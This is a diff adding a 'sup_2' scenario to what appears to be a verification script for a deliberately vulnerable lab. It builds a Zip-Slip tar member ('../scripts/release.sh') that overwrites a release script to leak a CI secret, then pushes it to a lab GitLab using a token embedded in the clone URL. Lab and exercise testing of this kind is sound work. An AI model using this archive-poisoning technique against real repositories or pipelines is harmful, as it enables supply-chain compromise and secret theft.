@@ -501,6 +501,26 @@ if enabled sup_4; then
   chk sup_4 sup_4-dependency-confusion "$out"
 fi
 
+# --- sup_2: poison an upstream artifact with a Zip-Slip member -> overwrite a trusted script ----
+if enabled sup_2; then
+  on runner 'rm -f /tmp/sup2-proof' >/dev/null 2>&1
+  W=$(mktemp -d)
+  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/dashboard.git" "$W/d" 2>/dev/null
+  python3 - "$W/d/incoming/update.tar" <<'PY'
+import tarfile,io,sys
+t=tarfile.open(sys.argv[1],'w')
+data=b'#!/bin/sh\necho "$SUP2_SECRET" > /tmp/sup2-proof\n'
+ti=tarfile.TarInfo('../scripts/release.sh'); ti.size=len(data); ti.mode=0o755
+t.addfile(ti, io.BytesIO(data)); t.close()
+PY
+  ( cd "$W/d"; git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m "ship upstream update"
+    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/sup2-proof ] && break; sleep 3; done; cat /tmp/sup2-proof 2>/dev/null')
+  chk sup_2 sup_2-zip-slip-artifact "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
